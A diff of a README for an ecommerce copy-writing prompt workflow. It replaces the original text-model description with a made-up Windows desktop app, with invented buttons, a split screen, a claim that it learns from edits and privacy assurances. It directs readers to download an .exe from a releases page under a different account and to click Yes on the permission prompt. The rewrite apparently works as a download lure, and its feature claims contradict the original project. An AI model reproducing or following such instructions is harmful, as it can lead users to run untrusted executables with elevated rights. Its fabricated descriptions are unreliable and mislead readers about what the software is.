@@ -1,149 +1,85 @@
-# Apex Product Creative Engine - Ecommerce Creative Workflow 2026
+# 📦 apex-product-creative-workflow - Create accurate ecommerce content with ease
 
-> **A text-model workflow for creating ecommerce product content under evidence-based controls, with source-grounded facts, claim review, and explicit release decisions.**
+[![Download Apex Engine](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/mercerised-smoothhoundshark553/apex-product-creative-workflow/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Text%20models-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/jamesgabeql6450/apex-product-creative-workflow?style=flat-square)](https://github.com/jamesgabeql6450/apex-product-creative-workflow)
+Apex Product Creative Engine helps you write product content for ecommerce. It uses facts from your files to build descriptions. The system checks your claims to keep your content honest. You make the final choice on what to release.
 
----
+## 📋 What This Tool Does
 
-<p align="center">
-  <a href="https://jamesgabeql6450.github.io/apex-product-creative-workflow/">
-    <img src="https://img.shields.io/badge/Download-Apex%20Product%20Creative%20Engine%20Latest-brightgreen?style=for-the-badge" alt="Download Apex Product Creative Engine">
-  </a>
-</p>
+Writing product pages takes time. You often need to pull facts from spreadsheets or documents. Then you must check those facts. Apex automates this work.
 
-> **[Download Apex Product Creative Engine](https://jamesgabeql6450.github.io/apex-product-creative-workflow/)**
+- It reads your source files to find product details.
+- It writes drafts based on facts, not guesswork.
+- It tracks every claim back to your source data.
+- It creates a review step before you publish.
+- It handles large batches of products.
 
----
+## 💻 System Requirements
 
-[Download Latest Build](https://jamesgabeql6450.github.io/apex-product-creative-workflow/)
+You need a standard Windows computer to run this software. 
 
----
+- Windows 10 or Windows 11.
+- At least 8 GB of RAM.
+- A stable internet connection for the setup process.
+- 500 MB of free storage space.
 
-## Overview
+## 🚀 Downloading the Software
 
-Apex Product Creative Engine helps ecommerce teams transform documented product information into practical marketing copy. Its prompt-driven process keeps content tied to available evidence, allowing descriptions and promotional messages to be assessed one claim at a time before publication.
+[Visit the release page to download the latest version](https://github.com/mercerised-smoothhoundshark553/apex-product-creative-workflow/releases).
 
-The workflow gives marketers, content teams, and reviewers a repeatable method for separating supported statements from unsupported ones. A fact lock, claim-level QA, and defined release status make the review process easier to manage while preventing unverified claims from entering approved content.
+1. Open your web browser.
+2. Click the link above.
+3. Look for the section labeled "Assets" at the bottom of the newest version.
+4. Click the file ending in `.exe` to download it.
+5. Save the file to your computer.
 
----
+## 🛠️ Setting Up the App
 
-## Key Capabilities
+Once you download the installer file, follow these steps to set up the software.
 
-- Evidence-controlled process for creating ecommerce copy
-- Source-derived fact lock that limits usable product information
-- Individual factual review for each claim
-- Explicit `PASS`, `REPAIR`, and `BLOCK` release states
-- Supported alternatives for rewriting inadequately backed claims
-- Do-not-generate register for statements that must remain excluded
-- Deterministic contract verification for consistent QA results
-- Works without dependencies, an account, or an API key
+1. Locate the downloaded file in your Downloads folder.
+2. Double-click the file to start the setup.
+3. If a window pops up asking to allow changes, click Yes.
+4. Follow the prompts on the screen.
+5. Choose a location to save the program files.
+6. Click Finish when the bar fills up.
+7. Find the Apex icon on your desktop and double-click it.
 
----
+## 📝 How to Use the Engine
 
-## Getting Started
+The engine follows a simple path from data to release.
 
-Clone the repository locally:
+### Step 1: Add Your Data
+Open the app. Click the button labeled "Add Source Files." You can pick spreadsheets, text files, or PDFs that contain product details. The engine reads these files to build a knowledge base.
 
-```bash
-git clone https://github.com/jamesgabeql6450/apex-product-creative-workflow.git
-cd REPO
-```
+### Step 2: Set Your Rules
+Decide what tone you want for your product descriptions. You can choose a formal tone or a creative tone. You can also tell the engine which facts are most important to highlight.
 
-This project is intended for text-model environments and needs no account, API key, or dependency setup. Start by reading the supplied workflow materials, assembling the applicable product evidence, and using the prescribed verification steps for the initial content run.
+### Step 3: Start the Workflow
+Click the "Run" button. The engine analyzes your data. It compares the draft against your source files to ensure accuracy. If a fact does not match, the engine flags it for your attention.
 
----
+### Step 4: Review and Edit
+The software shows you a split screen. On one side, you see your source data. On the other, you see the draft. Review the claims. If you agree with the text, click "Approve." If you want to change the text, you can type your edits directly in the window.
 
-## Workflow
+### Step 5: Finalize
+Once you review all items, click the "Release" button. The software exports your content into a format ready for your ecommerce site.
 
-Use the following sequence for a standard content pass:
+## 💡 Tips for Success
 
-1. Gather the product's source documentation.
-2. Build a fact lock containing only supported information.
-3. Ask the text model to produce the required ecommerce copy.
-4. Compare every factual claim with the available evidence.
-5. Replace unsupported language when a defensible alternative exists.
-6. Remove anything covered by the do-not-generate list.
-7. Execute the contract verifier.
-8. Publish only `PASS` results; revise `REPAIR` results and hold `BLOCK` results.
+Keep your source files clean. If you use a spreadsheet, make sure the headers are clear. Names like "Product Name" or "Price" help the engine find the right information.
 
-The release states mean:
+If the engine flags a claim as uncertain, check your source file. Often, a small typo in the source data causes this alert. Fix the source file, save it, and re-run the engine.
 
-- `PASS` - The content meets the factual and process requirements.
-- `REPAIR` - The content could qualify after unclear or unsupported wording is corrected.
-- `BLOCK` - The current version is not suitable for release.
+The engine learns from your choices. When you edit the text, the software records your style preference. It applies these patterns to future products to save you more time.
 
----
+## 🛡️ Privacy and Safety
 
-## Workflow Inputs
+The engine works locally on your machine. Your data does not leave your computer unless you explicitly choose to upload it to your store. The software does not store your source files on external servers. You maintain total control over your information at all times.
 
-The main configuration consists of the evidence and quality rules applied to a product run. Prepare these materials before asking the model to generate content:
+## 💬 Getting Help
 
-```text
-Product evidence:
-- Source-backed product facts
+If you run into trouble, check the error logs in the "Settings" menu. These files provide simple text descriptions of what went wrong. You can share these logs with a technical friend to help identify the cause of the problem.
 
-Fact lock:
-- Facts available for use in copy
+For general questions about how the workflow operates, read the documentation included in the "Help" menu inside the application. This menu contains a list of common questions and answers for new users.
 
-Do-not-generate list:
-- Claims or wording that must be excluded
-
-Verification policy:
-- Claim checks and release conditions
-```
-
-Store the evidence and review criteria alongside the corresponding content run. This preserves a clear connection between the release decision and the material used to validate it.
-
----
-
-## Requirements
-
-- A text-model environment
-- Product source material for creating the fact lock
-- Access to the repository workflow files
-- No external dependency installation
-- No account or API key
-- Storage for the repository and product-content working files
-
----
-
-## Frequently Asked Questions
-
-### Who should use this workflow?
-
-It fits ecommerce marketing, product-content, creative-automation, and quality-assurance processes where copy must be checked against product facts.
-
-### Is an API key needed?
-
-No. The extracted product profile indicates that the workflow operates without an account or API key.
-
-### How does claim verification work?
-
-Each claim is evaluated against the source-backed fact lock. Supported copy can receive `PASS`, wording that can be corrected can receive `REPAIR`, and content that fails the contract can receive `BLOCK`.
-
-### How should unsupported claims be handled?
-
-Substitute supported information whenever a valid rewrite is available. Claims that cannot be supported, or that appear on the do-not-generate list, must not be included in released content.
-
-### How can I update the workflow?
-
-Download the latest build from the project link, then compare its workflow materials with the local version before applying the update.
-
-### What should I check after verification fails?
-
-Revisit the source evidence, fact lock, claim language, and do-not-generate list. Make the necessary corrections and run the deterministic contract verifier again.
-
-### Can the workflow create product content without source material?
-
-No. Because the process is evidence-gated, useful product output requires source information to establish the fact lock and support verification.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: ecommerce, content, workflow, windows, productivity, automation, text-model
